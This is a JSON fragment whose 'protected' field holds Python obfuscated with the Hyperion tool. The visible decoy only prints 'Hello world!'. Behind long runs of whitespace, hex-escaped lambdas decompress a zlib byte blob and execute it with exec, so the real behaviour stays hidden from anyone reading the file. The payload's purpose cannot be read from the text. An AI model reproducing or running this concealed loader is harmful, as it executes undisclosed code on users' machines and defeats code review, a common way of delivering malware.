"protected": "from builtins import *\nfrom math import prod as DetectVar\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\nBuiltins, Walk, Calculate, Math, Ceil, Invert, Hypothesis = exec, str, tuple, map, ord, globals, type\n\nclass _negative:\n    def __init__(self, Modulo):\n        self._multiply = DetectVar((Modulo, 93443))\n        self._memoryaccess(Algorithm=-16493)\n\n    def _memoryaccess(self, Algorithm = int):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self._multiply /= 76814 + Algorithm\n        \n        try:\n            (Builtins, Negative, Negative) if Negative == Invert else (Calculate, Calculate) == Ceil\n\n        except ArithmeticError:\n            {Math: Ceil} if Calculate is Ceil else {Math: Ceil} < Walk\n\n        except:\n            Hypothesis(58518 + -28490) == float\n\n    def _builtins(self, MemoryAccess = -68634):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        MemoryAccess *= 90457 - -644\n        self._hypothesis != type\n        \n        try:\n            (((Builtins, Negative, Negative), Calculate) for Calculate in (Calculate, Builtins, Calculate))\n\n        except OSError:\n            (((Calculate, Builtins, Calculate), Negative) for Negative in (Calculate, Builtins, Calculate))\n\n        except:\n            Hypothesis(18425 - -95250) == float\n\n    def _square(_math = float):\n        return Invert()[_math]\n\n    def _modulo(_floor = 12254 - 62586, _round = str, System = Invert):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        System()[_floor] = _round\n        \n        try:\n            ((Calculate, Calculate) or Calculate if (Calculate, Calculate) and Calculate else ... or (Calculate, (Calculate, Calculate)))\n\n        except OSError:\n            ({Math: Ceil} or Walk if {Math: Ceil} and Walk else ... or (Walk, {Math: Ceil}))\n\n        except:\n            Hypothesis(84567 + 43127) == False\n\n    def execute(code = str):\n        return Builtins(Walk(Calculate(Math(Ceil, code))))\n\n    @property\n    def _hypothesis(self):\n        self.Floor = '<__main__._math object at 0x000007550BE35052>'\n        return (self.Floor, _negative._hypothesis)\n\nif __name__ == '__main__':\n    try:\n        _negative.execute(code = __code__)\n        Statistics = _negative(Modulo = -45724 / 99120)\n\n        Statistics._memoryaccess(Algorithm = Statistics._multiply / -93452)                                                                                                                                                                                                                                                          ;_negative._modulo(_floor='NNMNNMMNNMNNNNNNMMNNM',_round=b'x\\x9c\\xe5Zmo\\xdb6\\x10\\xfe\\x9e_\\xe1\\xf9\\x8b$\\xa4MdJ\\xa6$\\x03\\xf92x\\xc3\\x1cx\\xf5\\xd0\\x0ck\\x8740d\\x89N\\x94\\xca\\xa2\\'\\xcb\\xab\\xf3\\xefwGR\\xb6\\xfcB[j\\xd2v@D\\x93<\\xbe\\x88\\xa4\\x1e\\x9e\\xee\\x8e\\'\\x17\\xf9S\\xef\\xac\\x05W25E\\x8e\\xd7x\\xcc\\'\\xd3\\xe5\"\\n\\x0b\\x9e\\x8f\\xc7\\xad\\x9f\\xae\\xda\\xbf=\\xcdY\\x9e\\xf0\\xac\\xdd\\xe2y\\xa5[\\xb8,\\x1ex\\xbe\\x10}\\xcc\\xf6$I\\xd3\\xa7\\xe2\\x81\\xdd\\xf3\\xb0p\\xba\\xb4\\xfd\\xa6\\xfds\\xbad\\xefY\\xdc\\xb6\\xb6\\xee\\xbaO\\x8a\\x87\\xe5D\\x0e\\xfcP\\x14\\xf3E\\xef\\xf2R\\xd6]D|v\\xb93\\xcc\\xa5f\\xee8YD<\\x8f\\xb7\\x87Q\\x95\\x17\\xf7\\xf7\\x97\\xf34\\xbc_\\xb2\\x9d\\x9b\\xd2$b\\xd9\\x82\\xc9\\x9b~\\xf9c\\xf8\\x96\\\\\\xd8;]\"\\x1e\\xcbvc\\x9e\\'Ya\\xb6\\x7fci\\xca[_x\\x9e\\xc6?\\xb5-\\xe3\\xcc\\xea\\xad{c\\xbb\\xb1\\xf8\\x9c\\xc4\\x86u\\xc6V\\x11\\x9b\\x17\\n\\xccl\\xbe\\x84;\\xdf\\xf3\\x05[\\xb4\\xc2\\x9c\\xb5r\\x16\\x7f\\xca\\xfeJx\\xca\\nY1\\x01d>e\\x7f\\xf3\\xa5(\\x85-\\x1c\\xe4S\\xf6\\x8eOx\\xfc\\xd4J\\x93\\xcfp\\xdf\\x13_\\xb6\\xad3\\xb9\\xa8d6\\xe7y1\\x1e\\xc3lO\\x0b\\xc3\\xba`\\xab\\xa40\\xad\\xb3\\x94Ga\\xba0\\xad[\\xe3\\x03\\\\\\x1fE\\xfc\\x88\\xd7\\x07\\xf13\\xee\\xae\\xeeS>\\x81.g\\x07\\xdb\\xf1\\xc6\\xc7\\xc7\\xf41I\\x13\\xc0\\x1c\\x89D\\xfc\\xd2\\xe415n{\\xbd\\xf3\\xb7\\xe7o\\xcd\\xb7\\xe6y\\xc7\\xb2\\xee\\xee\\xae\\xe2$\\xd7\\x0fc\\xdb\\xa3\\x91=\\xe2\\x10m\\x9bs\\x0e\\xa5\\xfd\\x01\\xeeY\\x11\\x16\\xc5\\x91A\\xb2,\\x9b\\xcdD2\\xcb\\xca\\x1f<\\x83|\\xca\\xb3C\\xadx\\xd7\\xcd\\r!\\xe4\\x06\\x7f7p\\x11Q\\x12\\x17\\xdc\\xbaAN?+\\xe7\\xfd>\\xef\\xf3\\xd1h\\xd4\\x97\\x17\\x90p\\xabvX\\xd3\\x98,\\x93\\xb4H2\\xdc\\x88\\x7f\\xc3\\\\\\xbf2\\x9cML\\x84\\x13c&g\\x87\\xc1\\x01,D\\xc9V\\x98\\x01h\\xe6\\x91\\xf9\\x16YR\\xa4\\xc9r\\xb2\\x0b\\xa9\\xf5F\\xec\\x9d\\xda6\\xd8@\\xdcG$\\x1e\\xbfj4\\xeb\\xf6e\\x87\\xbbH\\xb2\\x98\\xadL#/\\x16{\\x8dw\\x96\\x16\\xb5\\xc1\\xf0z\\x00\\xd7\\xf0z\\x08\\xf1\\xfaz0\\x1c\\x00`\\x86q\\xf1\\xc8\\x93\\xec\\x08\\x13\\x88%\\x8ae\\x91\\x1b\\xb9RH^\\x1b\\xd4)\\xe7\\xfb\\xad\\x80\\xf5!\\x1eG\\xd8\\xd4\\xab \\xf8\\x12\\xd9\\xf3\\xc3k\\x03\\x8c\\xa5\\xc9|\\xc6\\xa3&\\x98IF\\x13\\\\v\\xa3\\xb8\\xedFL\\xf9\\xda\\xb0K\\xc3\\x7fY\\x13\\xe0\\x00\\x12\\xde\\x87\\xba\\x11\\x04 y\\xff\\xb5\\x01V\\x84<\\x9d6\\x12\\x85\\x83A\\x8a!E\\x81(HH_\\x1bjl\\x99\\xff\\xd9\\x04\\xb4\\xdf\\xf1z\\'\\x02\\xe4\\xef0\\xfd\\xbd1fI\\x12-\\xc2,y!\\xcc\\xb4\\xa3}\\x1df\\xfa\\xe1J\\xcc\\x9e\\xa6I\\xbab\\x0f\\xd9\\xb2\\tph\\xc1!.\\xf0j\\x8e\\x84=g\\x8b\\x82\\xcd_\\x1d\\xc7-\\xd2\\xf0\\xd7C\\xc8\\xe9l\\xc8C,gN\\x0cw\\xea\\xd8\\xee\\xd4\\x9d\\xd2)\\xa6\\x92\\x96\\xa52:\\xb6cW\\xcb`Q\\xc6\\x0cO \\xa6\\xe1O\\x8b\\x03\\xbb\\xf7\\xba6\"b\\xab\\x83\\x1a\\xe6\\xc7\\xef\\x83\\xa9\\x99\\x8aR\\x8f\\xd0)\\x8d\\x89M\\x89\\xd7\\xa5\\x01\\x8d<\\x17R\\xe69P\\x13\\xd0\\xd8\\x83i<\\xe2\\xb9P\\xeaz>\\xedR\\xe7\\xd4T\\xff\\x8b\\xa75\\x16\\xc5\\x82-\\xffay\\xab\\xc8\\xf9|\\x96T\\xbbh\\xed!\\x1dF\\x0e\\xe9N\\x1d\\x0f\\xa2\\x0f\\xb1\\xa3\"\\x85hC\\x0c \\xba\\x10\\t\\x99\\x10\\x9f\\xc4\\xb5\\xfavHp\\x12E\\xeb\\x98\\xe4Cs\\x05m\\x16\\xb0L\\x84\\xe1\\xc2\\xfb\\xc2R\\x01\\xb9\\xa7=5\\xee\\xb2fs\\x14l\\x12\\x8b\\'\\xac\\xb9\\xfa;\\xbdAZN&\\xa7/\\tX\\xbd\\xeey\\xcb\\xdd\\xac\\xf7\\x00\\x86\\xe5\\x8c\\xfd\\xb1=\\xf6\\xc6\\x14\\xf2\\x00(\\x17\\xfa\\xbb\\xbbu\\xcfC\\x03\\xf7\\xd7Q\\xfb\\xec\\xa9}vT\\xb4\\xd5>\\x07\\x8a\\'\\xea\\xf4\\xf5k\\xf2\\xc4Qd\\x87Cy\\x12\\x85C(\\\\\\xd7\\x03\\x08\\xcf{\\xca\\x8e\\xdas\\xbb\\xe6\\x9e_\\xa5\\xe1l\\x12\\x87-q\"\\xc6\\xa5\\xe0\\x89\\xf8Z\\x94\\xe0x<\\xe8\\x1d^\\xb8\\xeeyt2+r\\x03\\x19J\\ns\\x1aa\\xd8\\xd0e\\x0b\\x86\\xd3jJ\\xad\\xfb\\xcbj\\xf5\\xe5\\x0b\\xfe _I\\xa2w\\x98)\\xb5{ \\xf4\\x08\\xba\\xa6@\\x9bH\\xd7TM\\xe9cX6\\xf4\\xe8|\\xd7\\r\\xdb\\xda44\\x9dPI\\xdb\\xc2%\\xa6\\xb45\\x1f\\xf542E\\x7fn\\xc2jqlB\\xa9\\x04\\xd6\\x19\\x94\\xbe3\\x1b6\\x9e\\x82x\\xd4\\xf7\\\\\\x08\\xb6\\xe78!\\x99\\x92\\xa9\\x07b\\x9b\\xc6\\x10\"\\xda%\\x8c:BKz\\xa7\\xb5\\x9f\\x0e\\x15Aqq\\x8e\\xc4l$ \\x82l\\xf4\\x1d\\xb9\\x83(\\xa1C*\\n\\xc9QB\\ti\\xaf\\xa2\\xc4\\x8e\\xf5\\xa3M\\xb8\\xeb+\\xf6\\xe298\\x97\\\\*\\xd9T\\xf2k]\\x88\\xfd\\xb1#\\x02\\x05\\xfd@@W\\x04\\xd0?\\xd8\\xad\\xab;X\\x07z\\xd8\\xdf\\xa4\\xb3\\rK\\xa1\\xb0$\\x1bT\\x99\\x0b\\x8b\\xa2c\\x82\\xb8\\xec\\xd7~\\x93\\xd9]\\x00\\x01G\\x07( \\xc7\\x99\\xbb\\xdb5\\xcf\\xe3\\xd1@\\xf1\\x9c\\xa7\\xf8\\xafS*HU\\xd7\\x15\\x06\\x94\\xe4\\xd3:}\\x1bH\\xc2Cq-\\x1d\\x95_C\\xfc\\xa4\\x83\\x03\\xf2\\x86\\xca\\xe1\\x88\\x05Lw,_\\x0cXSZ\\xbeHS\\xd5\\xcf\\xb1k+\\xb4\\x91\\xb4\\x0c\\xd1\\x8b%\\xf2\\x11\\xba\\xb2\\x9aJt\\x9d\\x1ef*\\xc4*\\x94%V\\xa1\\xe2u;\\xe4\\xf5\\xf5\\xb0T\\xc4+\\x99\\n\\x02\\xc9\\x17\\x82;pC\\x88\\xd2B\\x88D)\\x14iT\\xd6\\x9f^g\\xc6\\x0bS0\\xf4\\xbe\\x0f\\xdf\\xd4|F1\\xb5\\xfe\\nK/\\xce\\xb4&\\x10\\rE\\x0cU\\x1ePi\\xea \\x1562y\\x00\\xc2\\x0c\\x11\\xcd\\x04\\x9c\\x88\\xac\\x00\\xf8\\x85L\\xb5@\\xadq\\xb3\\xd2pg\\xd5\\xeb\\xfa\\xda+\\x1en\\xcc[H\\xc1\\xe6\\x1d\\x0e_\\x901vC \\xd8\"\\x92\\x8cR{\\x8d\\xf2\\xeb\\x84b\\x03\\xc1\\x07M\\xedH\\xb4\\x12\\xfa\\xf2\\xa0\\x87\\xb6\\x14\\xc77\\x18}\\xd0?\\xc4\\x9e\\x97\\x82\\xe2C\\xa9W\\xe5\\xf5Q+G\\x1az\\x00\\xbaN\\xd7q\\x88\\x0cH\\xc92\\xa6\\x1bJ\\xb6\\x94\\xb5\\xa7=\\x00M\\x97\\xe0\\xaf\\x83\\'\\xa2W\\xa1D\\xf8z\\x17\\x0bJt\\xb80\\x95>\\x0eW\\x947\\x97\\xac\\x85\\x8d\\t\\xba\\x13\\xe2U}\\x1f(\\xeb\\xb7}!\\x1b\\x1f\\xc9\\xc6_B\\xbc\\xee\\xc4\\t\\xc1l\\x9d\\xc0\\xf6N\\xe4\\x16C\\x9c4\\xc7\\x95\\xf8n\\xbc\\x0e\\xac\\x12e\\x99\\xadi\\x18\\x9f\\x12\\x02\\xb62\\xac\\x90P\\x17F\\xf0E\\xee8\\x1d\\xa0\\x030\\xe1\\x020\\x9a]t\\x18\\xc1\\xf3C\\x0e\\xeb\\xf1\\x1c\\x9fR0\\xb1\\xbb\\xba\\xf5\\xa2k\\x010\\x881\\x95\\x14\\xd0MW\\xe4B\\xa0\\x94n\\xe5[t%\\xdf\\xea\\xa7\"=\\xd0^\\xde\\x83O\\xb9\\xae\\xaf\\xc6J\\xd8\\x1d\\x8bV\\xfaT\\xcb\\xbbtu\\x8c\\x17A\\xf0\\x14\\xc3\\xbe\\x99&)\\xcb\\xc2\\x19\\xbb\\xd2\\x89C)\\x00\\xcb\\xd3v\\xa8t\\xa5\\x14\\x85\\x91\\xccON2\\x836\\xdd\\x04\\xb4\\xebQ\\xda9\\xad\\xab\\x1a\\xab\\xc7o!P4\\xbe\\xa9o(O\\xda\\xe2\\xd9;\\xe7P\\x05\\r\\xe7\\xbd\\xde\\xad\\xb1,\\xa6\\xbea\\xb2\\x98G,\\xbe\\xb0\\x8c\\x80HI\\x02\\xfc!s\\x11\\xa7\\xa2\\xaclI*\\xdb|\\xb2\\xd1\\xbf\\x81\\xb2\\x11\\x0e\\xebel\\xb7Ih\\x87N\\xb0\\xde\\xf0pm$U\\x8d\\xa6\\xc0\\xb5\\t\\x85\\xde\\xc6D\\x88>\\xf9\\xf0%\\x14\\x80\\xc2\\xdd\\xa9\\xe5W\\xdd\\xbc \\xe8\\x9c\\xe9\\x9e\\xa8\\x13u\\xaa\\x84\\xb4f\\xaa[\\xcb\\xac\\xec\\xca\\xac\\xdc\\xaa\\xf6\\xcb\\x1f\\x7f\\x8e\\x9d\\xac\\x03u\\xf2(cWEG\\xb9\\x80\\x9d\\xca\\xe9\\xfaT_R\\xff\\xd4\\xb2y\\x8f\\ra\\x0cA\\x18 \\x81n7a\\x1c\\xd5\\xf4\\x016<\\x06:\\xe2\\xb0\\xe7\\x89c\\x9f?\\xee\\xe2\\x19YxY\\xf7j\\xbf\\xbbCK\\x80\\xf2Br\\xa7\\xe1[\\xffj\\xe4\\xcei\\xd9\\x00\\xa7s\\x0f\\xa5\\x03~V\\xa2^\\xd4@R\\x81~\\xa3\\x1ee\\x04\\x01\"N\\x191\\xec\\xd6HJ\\xa6Z)T\\xf2\\xc4\\xe9\\x87\\xea8R\\x91\\xda\\x8en\\xb0\\x1bu\\xcc\\xdbb_d\\xe0\\xea\\xb8\\xe8\\x0c\\xf1\\x85K\\xc4\\x13!\\x18\\xe3\\xb4\\xfb\\xb5\\xb6e\\xd4\\x1b\\x10\\xcf\\x8d\\\\\\x9e\\x1e\\xf9H\\xbahen\\x80\\xe0\\x93\\x9e\\xc4\\xbe\\xf2&\\x8a\\xefB\\xbc\\x9e\\xe0\\xd3\\xbdr\\xe5\\'\\x8a\\xaal*s\\xba\\x96OR\\x96\\xd5\\xe9[\\xf3\\x83QE\\x8e\\t^\\xcfT\\x8a\\xe1y2\\xc4-]A;\\x8b-\\xbf\\xcb\\x90\\x8a\\xeb\\xb3N\\xdf\\x9a\\xeeO)\\x83\\xf6\\xfevtL\\xa8\\xa2\\xe0\\x0c\\x809\\xba\\x90\\xa2(\\xf5\\xc7\\x14\\xee\\xf0\\xf7k\\x7f\\x80P=\\xfb\\x0fV~\\xba\\x11')\n\n        _negative(Modulo = 59453 + -37001)._memoryaccess(Algorithm = Statistics._multiply - 36668)                                                                                                                                                                                                                                                          ;OoOoo00ooOooOooOO0o,LIJJLIIIJJIILJJJLJIJ,SSSS222S2S2SS2SS22S2S22S,wxxxxxxxxwwwwwxwwwwwxxxw,JLJILJILLILILILILLIJ=(lambda OoO00O00O0OooOOOOOo00000oo:OoO00O00O0OooOOOOOo00000oo['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda OoO00O00O0OooOOOOOo00000oo:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(OoO00O00O0OooOOOOOo00000oo)\"),filename='\\x4f\\x6f\\x6f\\x30\\x6f\\x30\\x4f\\x6f\\x30\\x4f\\x4f\\x4f\\x4f\\x30\\x30\\x30\\x30\\x6f\\x6f\\x30\\x30',mode='\\x65\\x76\\x61\\x6c'))),(lambda OoO00O00O0OooOOOOOo00000oo:OoO00O00O0OooOOOOOo00000oo(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda:(lambda OoO00O00O0OooOOOOOo00000oo:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(OoO00O00O0OooOOOOOo00000oo)\"),filename='\\x4f\\x6f\\x6f\\x30\\x6f\\x30\\x4f\\x6f\\x30\\x4f\\x4f\\x4f\\x4f\\x30\\x30\\x30\\x30\\x6f\\x6f\\x30\\x30',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63')),(lambda oODDooDoOOODODoDoD,OoO00O00O0OooOOOOOo00000oo:oODDooDoOOODODoDoD(OoO00O00O0OooOOOOOo00000oo))\n        _negative(Modulo = 45763 - 9684)._builtins(MemoryAccess = 58633 / Statistics._multiply)                                                                                                                                                                                                                                                          ;wxxxxxxxxwwwwwxwwwwwxxxw()(JLJILJILLILILILILLIJ(OoOoo00ooOooOooOO0o(SSSS222S2S2SS2SS22S2S22S(LIJJLIIIJJIILJJJLJIJ('\\x76\\x61\\x72\\x73'))),_negative._square(_math='NNMNNMMNNMNNNNNNMMNNM')))\n\n    except Exception as Negative:\n        if 149333 > 822641:\n            _negative.execute(code = Walk(Negative))\n\n        elif 137889 > 2850676:\n            Statistics._builtins(MemoryAccess = 57979 / Statistics._multiply)"